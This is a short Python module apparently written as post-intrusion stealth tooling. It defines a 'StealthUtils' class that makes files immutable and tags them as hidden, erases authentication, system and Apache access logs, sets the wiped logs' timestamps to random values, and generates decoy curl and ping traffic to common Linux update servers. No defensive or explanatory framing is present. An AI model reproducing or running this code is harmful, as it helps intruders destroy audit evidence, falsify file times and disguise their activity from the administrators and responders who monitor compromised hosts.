import os
import random


class StealthUtils:
    @staticmethod
    def hide_file(path):
        """隐藏文件属性设置"""
        os.system(f"chattr +i {path}")
        os.system(f"setfattr -n user.hidden -v 1 {path}")

    @staticmethod
    def clean_logs():
        """清理系统日志痕迹"""
        logs = [
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/apache2/access.log'
        ]
        for log in logs:
            if os.path.exists(log):
                with open(log, 'w') as f:
                    f.write('')
                ts = random.randint(1000000, 9999999)
                os.utime(log, (ts, ts))

    @staticmethod
    def generate_decoy_traffic():
        """生成伪装流量"""
        domains = [
            'update.raspberrypi.org',
            'ppa.launchpad.net',
            'archive.ubuntu.com'
        ]
        for domain in domains:
            os.system(f"curl -sI https://{domain} >/dev/null")
            os.system(f"ping -c 2 {domain} >/dev/null")